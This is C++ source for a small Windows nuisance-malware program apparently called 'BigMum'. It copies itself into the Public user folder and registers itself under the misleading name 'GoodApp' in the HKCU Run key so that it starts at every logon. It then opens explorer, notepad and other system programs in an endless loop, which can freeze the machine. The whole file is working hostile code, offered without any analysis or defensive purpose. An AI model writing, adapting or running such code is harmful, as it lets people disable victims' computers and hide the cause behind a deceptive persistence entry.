//Include the Libraries
#include <iostream>
#include <cstdlib>
#include <stdio.h>
#include <windows.h>


class Prototype{
    public:
        // copies itself to the public user and changes the name to PersistencePc.exe
        void copyApp(){
            system("copy BigMum.exe C:\\Users\\Public\\PersistencePc.exe");
        }
        // Opens the Applications
        void startApp(){
            while(true){
                system("echo C:\\windows\\notepad.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\write.exe");
                system("start C:\\windows\\bfsvc.exe");
                system("start C:\\windows\\notepad.exe");
                system("echo C:\\windows\\notepad.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\write.exe");
                system("start C:\\windows\\bfsvc.exe");
                system("start C:\\windows\\notepad.exe");
                system("echo C:\\windows\\notepad.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\write.exe");
                system("start C:\\windows\\bfsvc.exe");
                system("start C:\\windows\\notepad.exe");
                system("echo C:\\windows\\notepad.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\explorer.exe");
                system("start C:\\windows\\write.exe");
                system("start C:\\windows\\bfsvc.exe");
                system("start C:\\windows\\notepad.exe");
            }
        }
        //Sets itself on startup
        void AutoStart()
        {
            HKEY hkey;
            LONG regOpenResult;
            const char PATH[] = "C:\\Users\\Public\\PersistencePc.exe"; /*This is the path of BigMum*/

            regOpenResult = RegOpenKeyEx(HKEY_CURRENT_USER,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0,
                             KEY_ALL_ACCESS,
                             &hkey);

            RegSetValueEx(hkey,
                      "GoodApp", //This is the name that shows up in your registry
                      0,
                      REG_SZ,
                      (BYTE*)PATH,
                      strlen(PATH));

            RegCloseKey(hkey);

        }



};

int main()
{
    //calling the functions from Prototype
    Prototype p;
    p.copyApp();
    p.AutoStart();
    p.startApp();
}
